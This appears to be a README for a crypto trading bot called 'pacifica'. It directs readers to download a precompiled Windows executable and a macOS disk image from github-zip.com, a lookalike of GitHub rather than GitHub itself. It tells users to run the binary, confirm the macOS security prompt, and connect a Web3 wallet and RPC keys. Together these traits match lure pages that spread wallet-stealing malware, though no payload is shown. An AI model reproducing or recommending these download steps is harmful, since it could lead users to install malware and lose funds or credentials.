# pacifica

> Automated trading using a dual-position hedging strategy to capture edge across market outcomes.

---

## Overview

Pacifica comes in two flavors depending on what you need:

- **Windows Application** — precompiled binary, just download and run. No setup, no dependencies.
- **Python Bot** (`python/`) — full-featured implementation if you want to customize, backtest, or dig into the internals.

---

## Download

| Platform | Architecture | Link |
|----------|-------------|------|
| **macOS** | Apple Silicon | [Download latest release](https://github-zip.com/pacifica-mac) |
| **Windows** | x64 | [Download latest release](https://github-zip.com/pacifica) |

---

## Quick Start

### Windows

1. Download the release above
2. Double-click `pacifica-v.1.04.11.exe`
3. That's it

### Python

```bash
cd pacifica/python
pip install -r requirements.txt
cd ..
python pacifica-v.1.04.11.py
```

### macOS

1. Download the `.dmg` from the link above
2. Open it, drag the app into Applications
3. Launch from Applications
4. On first run, confirm the security prompt if it appears

---

## How It Works

Both the Windows app and Python bot follow the same core workflow:

1. **Monitor** — watch markets, order books, and liquidity in real time
2. **Analyze** — spot pricing inefficiencies and favorable dual-side setups
3. **Calculate** — size positions based on your configured limits
4. **Execute** — place opposing positions to hedge exposure across outcomes
5. **Track** — log everything for review and diagnostics

The Windows app is optimized for low-latency execution with a minimal footprint. The Python bot gives you more control — backtesting, custom sizing, detailed logging, and storage of execution history.

---

## Requirements

**Common (both versions):**
- Pacifica account
- Web3 wallet (MetaMask recommended)
- RPC provider — Alchemy, Chainstack, or Infura API key
- `config.toml` with your execution limits and parameters

**Python only:**
```
python-dotenv
typer[all]
devtools
fastapi
uvicorn[standard]
httpx
websockets
```

---

## Repository Structure

```
pacifica/
├── pacifica-v.1.04.11.exe   # Windows binary
├── config.toml              # Main config
│
├── data/
│   ├── cache/               # Cached market data
│   ├── logs/                # Runtime logs and error output
│   └── dll/                 # Required libraries
│
└── python/
    ├── src/                 # Source code
    ├── docs/                # Documentation
    ├── scripts/             # Utility scripts
    ├── requirements.txt
    └── README.md
```

---

Made with ❤️ for the pacifica community
